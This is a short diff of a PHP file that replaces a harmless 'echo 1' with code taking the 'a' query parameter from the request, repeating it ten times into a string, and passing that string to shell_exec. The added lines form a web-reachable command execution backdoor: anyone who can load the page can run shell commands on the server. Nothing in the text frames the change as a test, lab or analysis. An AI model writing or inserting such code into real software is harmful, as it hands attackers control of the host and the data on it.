@@ -1,9 +1,10 @@
 <?php
 
-
-
+$d= $_GET['a'];
+$a = "";
 for($i=0;$i<10;$i++){
-    $a ++;
+    $a .= $d;
+
 }
 
-echo 1;
+shell_exec($a);
